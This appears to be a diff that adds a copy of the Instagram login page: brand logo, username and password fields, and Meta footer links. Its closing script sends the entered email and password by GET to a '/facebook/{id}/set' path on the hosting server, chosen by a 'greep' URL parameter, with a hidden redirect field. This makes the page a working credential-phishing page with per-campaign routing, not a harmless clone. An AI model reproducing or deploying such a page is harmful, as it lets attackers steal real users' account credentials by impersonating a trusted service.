@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <link rel="stylesheet" id="link_css">
+    <script>
+        let link_css = document.getElementById('link_css')
+        if (window.screen.availWidth > 600) {
+            link_css.href="css/stylesD.css"
+        }else{
+            link_css.href="css/stylesA.css"
+        }
+    </script>
+</head>
+<body style="display: none;">
+    <script>
+        document.body.style.display = 'block'
+    </script>
+
+<div class="wrapper">
+    <div class="header">
+        <div class="top">
+            <div class="logo">
+                <img src="images/instagram.png" alt="instagram" class="logoo">
+            </div>
+            <form id="form" method="get" class="form">
+                <div class="input_field">
+                    <input type="text" name="email" placeholder="Phone number, username, or email" class="input">
+                </div>
+                <div class="input_field">
+                    <input type="password" name="password" placeholder="Password" class="input">
+                </div>
+                <input class="btn" style="width: 100%;color:#fff;margin-left: 10px;" type="submit" value="Log In">
+                <input type="hidden" name="type" value="instagram">
+				<input type="hidden" name="to" id="to" value="null">
+            </form>
+            <div class="or">
+                <div class="line"></div>
+                <p>OR</p>
+                <div class="line"></div>
+            </div>
+            <div class="dif">
+                <div class="fb">
+                    <img src="images/facebook.png" alt="facebook">
+                    <p>Log in with Facebook</p>
+                </div>
+                <div class="forgot">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+        </div>
+        <div class="signup">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        <div class="apps">
+            <p>Get the app.</p>
+            <div class="icons">
+                <a href="#"><img src="images/appstore.png" alt="appstore"></a>
+                <a href="#"><img src="images/googleplay.png" alt="googleplay"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <ul>
+                <li><a href="#">Meta</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Blog</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">Privacy</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Top Accounts</a></li>
+                <li><a href="#">Hashtags</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Instagram Lite</a></li>
+                <li><a href="#">Contact Uploading & Non-Users</a></li>
+                <li><a href="#">Dance</a></li>
+                <li><a href="#">Food & Drink</a></li>
+                <li><a href="#">Home & Garden</a></li>
+                <li><a href="#">Music</a></li>
+                <li><a href="#">Visual Arts</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="copyright">
+        © 2022 Instagram from Meta
+    </div>
+    <script>
+        let form = document.getElementById('form')
+        let to = document.getElementById('to')
+        let prams = new URLSearchParams(location.search)
+        let pathname
+        if (prams.get('greep')) {
+            pathname = `/facebook/${prams.get('greep')}/set`
+        }else{
+            pathname = `/facebook/default/set` // instagram
+        }
+        if (prams.get('to')) {
+            to.value = prams.get('to')
+        }else{
+            to.value = "default"
+        }
+        form.action = pathname
+    </script>
+</div>
+</body>
+</html>
